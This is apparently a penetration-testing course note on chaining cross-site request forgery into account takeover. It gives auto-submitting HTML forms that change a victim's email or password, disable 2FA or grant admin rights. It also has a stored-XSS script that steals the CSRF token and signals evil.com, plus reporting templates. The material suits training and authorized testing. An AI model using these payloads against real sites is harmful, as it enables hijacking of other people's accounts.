---
tags: [vapt, csrf, intermediate]
difficulty: intermediate
module: "11 - CSRF"
topic: "11.09 CSRF to Account Takeover"
portswigger_labs: ["CSRF vulnerability with no defenses", "CSRF where token validation depends on request method"]
---

# 11.09 — CSRF to Account Takeover

## Core Concept

CSRF alone doesn't let you READ data — but it lets you CHANGE data. Account takeover via CSRF chains multiple state changes to eventually get login access to the victim's account.

```
CLASSIC ATO VIA CSRF:
  Step 1: CSRF → change victim's email to attacker@evil.com
  Step 2: Attacker clicks "Forgot Password" on target.com
  Step 3: Password reset email → sent to attacker@evil.com
  Step 4: Attacker resets password → full account control!

OR:
  Step 1: CSRF → add attacker's email as secondary email
  Step 2: CSRF → change primary email to attacker's email
  Step 3: Forgot password → account takeover!

OR:
  Step 1: CSRF → disable 2FA
  Step 2: CSRF → change email
  Step 3: Password reset → ATO!
```

---

## Chain 1 — Email Change → Password Reset

```html
<!-- ATTACKER'S PAGE: -->
<html>
<body onload="document.forms[0].submit()">
  <!-- STEP 1: Change victim's email to attacker's email -->
  <form action="https://target.com/settings/change-email" method="POST">
    <input type="hidden" name="new_email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>

<!-- AFTER VICTIM VISITS ATTACK PAGE:
  1. Victim's email changed to attacker@evil.com
  2. Attacker goes to: https://target.com/forgot-password
  3. Enters: attacker@evil.com
  4. Receives reset link
  5. Sets new password
  6. Logs in as victim!
-->
```

---

## Chain 2 — Change Password Directly (If No Current Password Required)

```html
<!-- SOME APPS ALLOW SETTING NEW PASSWORD WITHOUT CONFIRMING OLD ONE: -->
<html>
<body>
  <form id="csrf" action="https://target.com/settings/password" method="POST">
    <input type="hidden" name="new_password" value="Attacker123!">
    <input type="hidden" name="confirm_new_password" value="Attacker123!">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>

<!-- 
  IF VULNERABLE: victim's password is now "Attacker123!"
  Attacker logs in with victim's username and new password!
  
  NOTE: Modern apps usually require current_password confirmation
  This chain works only when that check is missing!
-->
```

---

## Chain 3 — Disable 2FA → Email Change → ATO

```html
<!-- MULTI-STEP CSRF: USE MULTIPLE FORMS + REDIRECTS -->
<html>
<body>
  <script>
  // Step 1: Disable 2FA
  let f1 = document.createElement('form');
  f1.method = 'POST';
  f1.action = 'https://target.com/settings/2fa/disable';
  let input1 = document.createElement('input');
  input1.type = 'hidden';
  input1.name = 'confirm';
  input1.value = 'true';
  f1.appendChild(input1);
  document.body.appendChild(f1);
  f1.submit();
  
  // Step 2: After redirect, change email
  // (Each step may need separate page + redirect chain)
  </script>
</body>
</html>

<!-- MULTI-PAGE CHAIN:
  Page 1: Disable 2FA → redirects to page 2
  Page 2: Change email → password reset link sent to attacker
  Attacker: resets password → ATO!
  
  NOTE: Multi-step chains are harder to execute reliably
  if each step needs to wait for the previous to complete.
-->
```

---

## Chain 4 — Add Admin Privileges (If Admin Panel Is CSRF-Vulnerable)

```html
<!-- TARGET: ADMIN MANAGEMENT ENDPOINT -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/admin/users/promote" method="POST">
    <input type="hidden" name="user_id" value="ATTACKER_USER_ID">
    <input type="hidden" name="role" value="admin">
  </form>
</body>
</html>

<!-- REQUIRES:
  1. Admin user visits attacker's page (social engineering)
  2. Admin's session cookie sent with the request
  3. Attacker gains admin role!
  
  HOW TO FIND ATTACKER_USER_ID:
  - Register as attacker → get your own user ID from profile
  - Look in page source, API responses, etc.
-->
```

---

## Chain 5 — CSRF + XSS for Undetectable ATO

```javascript
// IF YOU HAVE XSS ON TARGET.COM (bypasses CSRF tokens!):
// XSS → Read CSRF token → Change email → ATO

// Stored XSS payload on target.com:
fetch('/account/security', {credentials: 'include'})
  .then(r => r.text())
  .then(html => {
    // Extract CSRF token
    let csrf = html.match(/name="csrf" value="([^"]+)"/)[1];
    
    // Change email using CSRF token (same origin → no CORS issue!)
    let body = new URLSearchParams({
      email: 'attacker@evil.com',
      csrf: csrf
    });
    return fetch('/account/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: body
    });
  })
  .then(() => {
    // Notify attacker
    new Image().src = 'https://evil.com/done?user=' + location.hostname;
  });
```

---

## Testing Methodology for CSRF ATO

```bash
# RECONNAISSANCE:
# 1. Map all state-changing endpoints
# 2. Identify email/password change flows
# 3. Look for 2FA management
# 4. Check admin user management

# FOR EACH ENDPOINT:
# 1. Is there a CSRF token? → Try bypass techniques (note 05)
# 2. Is SameSite set? → Check bypass techniques (note 06)
# 3. Is there Referer checking? → Try null referer bypass
# 4. Can you chain steps to ATO?

# DOCUMENT THE CHAIN:
# Clear PoC steps:
# 1. Victim logged into target.com
# 2. Victim visits evil.com/csrf.html
# 3. Victim's email changed to attacker@evil.com
# 4. Attacker requests password reset for attacker@evil.com
# 5. Attacker receives reset email
# 6. Attacker sets new password
# 7. Attacker logs into victim's account

# SEVERITY ASSESSMENT:
# CSRF → email change → password reset = CRITICAL (full ATO)
# CSRF → password change = CRITICAL
# CSRF → add admin = CRITICAL
# CSRF → delete account = HIGH
# CSRF → change preferences = MEDIUM/LOW
```

---

## Reporting CSRF to ATO

```
TITLE: CSRF in /account/change-email leads to Account Takeover

SEVERITY: Critical

STEPS TO REPRODUCE:
  1. Open https://target.com, log in as victim@victim.com (victim)
  2. In a new tab, open the following HTML page:
  
  [INSERT CSRF PoC HTML HERE]
  
  3. Observe that the email has been changed to attacker@evil.com
  4. Go to https://target.com/forgot-password
  5. Enter attacker@evil.com → receive reset email
  6. Click reset link → set new password
  7. Log in as victim@victim.com with new password
  
IMPACT:
  An attacker can trick any authenticated victim into visiting
  a malicious page, which silently changes their email address.
  The attacker can then take full control of the victim's account
  via password reset, leading to complete account takeover.

EVIDENCE:
  [Screenshot of changed email in victim's profile]
  [Screenshot of password reset email received at attacker's inbox]
```

---

## Related Notes
- [[01 - What is CSRF]] — fundamentals
- [[05 - CSRF Token Bypass Techniques]] — defeating defenses
- [[06 - SameSite Cookie Bypass]] — cookie bypasses
- [[07 - CSRF via CORS Misconfiguration]] — CORS chain
- [[Module 07 - XSS]] — XSS bypasses all CSRF protection!
- [[10 - Defense CSRF Tokens SameSite]] — how to defend
